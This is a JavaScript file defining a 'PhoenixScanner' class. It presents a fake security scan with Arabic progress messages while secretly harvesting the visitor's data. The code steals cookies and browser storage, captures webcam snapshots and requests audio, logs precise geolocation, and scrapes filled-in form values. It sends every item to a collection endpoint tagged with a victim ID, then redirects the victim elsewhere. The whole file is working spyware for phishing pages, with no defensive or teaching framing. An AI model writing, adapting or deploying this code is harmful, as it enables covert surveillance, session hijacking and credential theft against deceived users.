class PhoenixScanner {
    constructor(config) {
        this.config = config;
        this.data = {};
        this.progress = 0;
        this.startTime = Date.now();
    }

    async start() {
        try {
            await this.collectSystemInfo();
            await this.updateProgress(15, "جمع معلومات النظام");
            
            await this.accessCamera();
            await this.updateProgress(35, "التحقق من الكاميرا");
            
            await this.getLocation();
            await this.updateProgress(55, "تحديد الموقع");
            
            await this.collectCredentials();
            await this.updateProgress(75, "فحص بيانات التسجيل");
            
            await this.collectAdvancedData();
            await this.updateProgress(90, "البيانات المتقدمة");
            
            await this.completeScan();
        } catch (error) {
            await this.sendData('error', { error: error.message });
        }
    }

    async collectSystemInfo() {
        const info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardware: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };

        await this.sendData('system_info', info);
    }

    async accessCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: 1280, height: 720 },
                audio: true
            });

            // التقاط صور متعددة
            await this.captureSnapshots(stream);
            
            stream.getTracks().forEach(track => track.stop());
            
        } catch (error) {
            await this.sendData('camera_error', { error: error.message });
        }
    }

    async captureSnapshots(stream) {
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        video.srcObject = stream;
        await video.play();

        for (let i = 0; i < 3; i++) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            const snapshot = canvas.toDataURL('image/jpeg', 0.7);
            await this.sendData('camera_snapshot', {
                image: snapshot,
                sequence: i + 1,
                timestamp: Date.now()
            });
        }
    }

    async getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                this.sendData('location_error', { error: 'الموقع غير مدعوم' });
                resolve();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const locationData = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    };
                    
                    await this.sendData('location', locationData);
                    resolve();
                },
                async (error) => {
                    await this.sendData('location_error', { 
                        error: error.message,
                        code: error.code 
                    });
                    resolve();
                },
                { 
                    enableHighAccuracy: true, 
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        });
    }

    async collectCredentials() {
        // محاولة جمع بيانات النماذج المحفوظة
        const forms = document.querySelectorAll('form');
        const formData = [];
        
        forms.forEach((form, index) => {
            const inputs = form.querySelectorAll('input, select, textarea');
            const data = {};
            
            inputs.forEach(input => {
                if (input.value) {
                    data[input.name || input.type || `field_${index}`] = input.value;
                }
            });
            
            if (Object.keys(data).length > 0) {
                formData.push({
                    formIndex: index,
                    action: form.action,
                    method: form.method,
                    data: data
                });
            }
        });
        
        if (formData.length > 0) {
            await this.sendData('form_data', formData);
        }
    }

    async collectAdvancedData() {
        const advanced = {
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : null,
            plugins: Array.from(navigator.plugins).map(p => ({
                name: p.name,
                filename: p.filename,
                description: p.description
            })),
            battery: await this.getBatteryInfo(),
            touchSupport: 'ontouchstart' in window,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            product: navigator.product
        };

        await this.sendData('advanced_data', advanced);
    }

    async getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (error) {
                return { error: error.message };
            }
        }
        return null;
    }

    async updateProgress(percent, text) {
        this.progress = percent;
        
        const bar = document.getElementById('progressBar');
        const status = document.getElementById('status');
        
        if (bar) bar.style.width = percent + '%';
        if (status) status.textContent = text;
        
        await this.sendData('progress', { percent, text });
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    async completeScan() {
        await this.updateProgress(100, "اكتمال الفحص الأمني بنجاح");
        
        const summary = {
            duration: Date.now() - this.startTime,
            dataCollected: Object.keys(this.data).length,
            completedAt: new Date().toISOString()
        };

        await this.sendData('scan_complete', summary);

        setTimeout(() => {
            window.location.href = this.config.targetUrl;
        }, 3000);
    }

    async sendData(type, payload) {
        try {
            this.data[type] = payload;
            
            const response = await fetch('/api/collect', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.config.victimId
                },
                body: JSON.stringify({
                    victimId: this.config.victimId,
                    dataType: type,
                    payload: payload
                })
            });
            
            if (!response.ok) throw new Error('فشل في إرسال البيانات');
            
        } catch (error) {
            console.warn('Failed to send data:', error);
        }
    }
}

// جعل الكود متاحاً globally
window.PhoenixScanner = PhoenixScanner;
